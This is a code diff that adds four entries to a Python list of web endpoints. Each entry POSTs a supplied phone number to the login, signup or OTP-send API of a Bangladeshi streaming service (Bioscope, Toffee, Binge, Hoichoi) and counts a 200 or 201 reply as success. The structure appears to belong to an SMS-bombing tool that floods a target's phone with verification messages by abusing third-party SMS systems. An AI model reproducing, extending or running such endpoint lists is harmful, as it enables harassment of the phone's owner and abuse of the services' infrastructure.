@@ -65,4 +65,34 @@ APIS = [
         "payload": lambda phone: {"phoneNumber": phone},
         "success": lambda r: r.status_code in [200,201]
     },
+    {
+        "name": "Bioscop",
+        "method": "POST",
+        "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
+        "payload": lambda phone: {"number": phone},
+        "success": lambda r: r.status_code in [200,201]
+    },
+    {
+        "name": "tofee",
+        "method": "POST",
+        "url": "https://prod-services.toffeelive.com/sms/v1/subscriber/signup",
+        "payload": lambda phone: {"mobile": phone},
+        "success": lambda r: r.status_code in [200,201]
+    },
+    {
+        "name": "Binge",
+        "method": "POST",
+        "url": "https://api.binge.buzz/api/v4/auth/otp/send",
+        "payload": lambda phone: {"phone": phone},
+        "success": lambda r: r.status_code in [200,201]
+    },
+    {
+        "name": "hoichoi",
+        "method": "POST",
+        "url": "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code",
+        "payload": lambda phone: {"phoneNumber": phone},
+        "success": lambda r: r.status_code in [200,201]
+    },
+    
 ]
+
